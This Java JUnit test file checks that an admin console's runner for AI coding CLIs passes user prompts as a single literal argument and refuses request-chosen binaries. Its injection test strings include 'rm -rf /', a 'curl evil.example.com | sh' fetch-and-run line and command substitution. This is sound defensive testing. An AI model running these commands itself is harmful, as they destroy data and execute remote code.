package com.github.diegopacheco.adminconsole.ai;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.nio.charset.StandardCharsets;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class AgentCliRunnerTest {
    private final AgentCliRunner runner = new AgentCliRunner(new CliAvailability(), 60);

    @ParameterizedTest
    @ValueSource(strings = {
            "count orders; rm -rf /",
            "count orders && curl evil.example.com | sh",
            "count `whoami` orders",
            "count $(whoami) orders",
            "count orders\nrm -rf /",
            "count 'orders' \"today\"",
            "count orders > /etc/passwd",
            "count orders | tee /tmp/x"
    })
    void passesTheUserPromptAsASingleArgumentSoShellMetacharactersAreJustText(String prompt) {
        List<String> command = runner.command(AgentCli.CLAUDE, "sonnet", prompt);
        assertThat(command.getLast()).isEqualTo(prompt);
        assertThat(command).doesNotContain("sh", "-c", "bash");
        assertThat(command.stream().filter(part -> part.contains(prompt)).count()).isEqualTo(1);
    }

    @Test
    void buildsTheDocumentedInvocationForEachCli() {
        assertThat(runner.command(AgentCli.CLAUDE, "sonnet", "hi"))
                .containsExactly("claude", "-p", "--model", "sonnet", "hi");
        assertThat(runner.command(AgentCli.CODEX, "gpt-5-codex", "hi"))
                .containsExactly("codex", "exec", "--model", "gpt-5-codex", "hi");
        assertThat(runner.command(AgentCli.AGY, "", "hi"))
                .containsExactly("agy", "-p", "hi");
    }

    @Test
    void neverLetsTheRequestChooseTheBinaryBecauseThatWouldBeArbitraryExecution() {
        assertThatThrownBy(() -> AgentCli.of("/bin/rm")).isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> AgentCli.of("curl")).isInstanceOf(IllegalArgumentException.class);
        assertThat(runner.command(AgentCli.CLAUDE, null, "hi").getFirst()).isEqualTo("claude");
    }

    @Test
    void omitsTheModelFlagWhenNoModelIsSetRatherThanPassingAnEmptyValue() {
        assertThat(runner.command(AgentCli.CLAUDE, null, "hi")).containsExactly("claude", "-p", "hi");
        assertThat(runner.command(AgentCli.CLAUDE, "  ", "hi")).containsExactly("claude", "-p", "hi");
    }

    @Test
    void rejectsAnOversizedPromptBeforeSpawningAnything() {
        String huge = "x".repeat(AgentCliRunner.MAX_PROMPT_BYTES + 1);
        assertThatThrownBy(() -> runner.run(AgentCli.CLAUDE, "sonnet", huge))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("larger than");
    }

    @Test
    void countsPromptSizeInBytesNotCharactersSoMultibyteTextCannotSlipPast() {
        String multibyte = "é".repeat(AgentCliRunner.MAX_PROMPT_BYTES / 2 + 1);
        assertThat(multibyte.length()).isLessThan(AgentCliRunner.MAX_PROMPT_BYTES);
        assertThat(multibyte.getBytes(StandardCharsets.UTF_8).length).isGreaterThan(AgentCliRunner.MAX_PROMPT_BYTES);
        assertThatThrownBy(() -> runner.run(AgentCli.CLAUDE, "sonnet", multibyte))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void rejectsAnEmptyPrompt() {
        assertThatThrownBy(() -> runner.run(AgentCli.CLAUDE, "sonnet", "  "))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> runner.run(AgentCli.CLAUDE, "sonnet", null))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void reportsAMissingCliClearlyInsteadOfFailingDeepInTheProcessApi() {
        CliAvailability never = new CliAvailability() {
            @Override
            public Availability of(AgentCli cli) {
                return new Availability(false, cli.binary() + " was not found on PATH", null);
            }
        };
        assertThatThrownBy(() -> new AgentCliRunner(never, 60).run(AgentCli.AGY, "", "count orders"))
                .isInstanceOf(IllegalStateException.class)
                .hasMessageContaining("agy was not found on PATH");
    }
}
